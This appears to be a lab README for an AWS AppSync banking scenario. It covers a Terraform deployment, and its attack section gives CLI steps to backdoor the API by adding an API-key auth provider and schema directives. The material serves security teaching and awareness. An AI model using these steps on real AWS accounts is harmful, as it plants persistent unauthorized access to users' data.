# AppSync - Backdooring with API Keys

## Overview

This setup deploys an AWS AppSync service, utilizing AWS IAM as the default authentication mode and featuring an additional endpoint authenticated via AWS Cognito. The scenario, inspired by an AWS tutorial [DynamoDB Transaction resolvers](https://docs.aws.amazon.com/appsync/latest/devguide/tutorial-dynamodb-transact-js.html), simulates specific banking functionalities

## Prerequisites

- AWS CLI configured with necessary permissions.
- Terraform installed.

## Deploying the Infrastructure

1. **Initialize Terraform**:
    ```bash
    terraform init
    ```

2. **Review Changes**:
    ```bash
    terraform plan
    ```

3. **Deploy Resources**:
    ```bash
    terraform apply
    ```
4. **Create Cognito users**: Access the AWS console, go to AWS Cognito and create a few users.


5. **Populate data in DynamoDB**:

Acces the AWS console, go to AWS AppSync and using the query option, execute the following mutation. Making sure to use the sub from Cognito as account name:

```
mutation populateAccounts {
  populateAccounts (
    savingAccounts: [
      {accountNumber: "SUB_FROM_COGNITO", username: "Tom", balance: 100},
      {accountNumber: "SUB_FROM_COGNITO", username: "Amy", balance: 90},
      {accountNumber: "SUB_FROM_COGNITO", username: "Lily", balance: 80},
    ]
    checkingAccounts: [
      {accountNumber: "SUB_FROM_COGNITO", username: "Tom", balance: 70},
      {accountNumber: "SUB_FROM_COGNITO", username: "Amy", balance: 60},
      {accountNumber: "SUB_FROM_COGNITO", username: "Lily", balance: 50},
    ]) {
    savingAccounts {
      accountNumber
    }
    checkingAccounts {
      accountNumber
    }
  }
}
```


## Attacking the Infrastructure

Add a new authorization provider, making sure to keep the existing ones. In our specific scenario, we need to keep AWS_IAM as the default authentication type and add API_KEY as an extra authentication provider, making sure we keep the configuration from the Cognito provider.

```
aws appsync update-graphql-api --api-id API_ID --name API_NAME --authentication-type AWS_IAM --additional-authentication-providers '[{"authenticationType": "AMAZON_COGNITO_USER_POOLS", "userPoolConfig": {"userPoolId": "USER_POOL_ID", "awsRegion": "us-east-1", "appIdClientRegex": "APP_ID_CLIENT_REGEX" }},{"authenticationType":"API_KEY"}]'
```

2. Generate an API Key

```
aws appsync create-api-key --api-id API_ID
```

3. Modify the schema and add the directive @aws_api_key, ensuring that the default directive @aws_iam is added when needed to avoid breaking the application. To do this, download the current schema:

```
aws appsync get-introspection-schema --api-id API_ID --format SDL schema.graphql
```

4. Edit the schema and then encode it in base64
```
base64 schema.graphql > schema_base64.txt
```

5. Lastly, add the new schema

```
aws appsync start-schema-creation --api-id API_ID --definition file://schema_base64.txt
```

## Understanding the Attack

Upon successfully adding an API key to the AWS AppSync service, an attacker gains a persistent and unauthorized entry point, allowing them to request data or perform modifications by utilizing the new API key in their requests. This not only enables the extraction of existing data within the API but also potentially allows access to data from new users in the future, maintaining an ongoing threat until the illicit API key is identified and removed. 

## Cleanup

To avoid incurring additional charges, ensure you destroy the Terraform-managed resources once done:

```bash
terraform destroy
```

⚠️ **Warning** ⚠️

> The content and techniques described here are meant for educational and awareness purposes only. Always be cautious when testing and use only in safe, controlled environments. Unauthorized use or misuse can lead to legal consequences and potential harm.
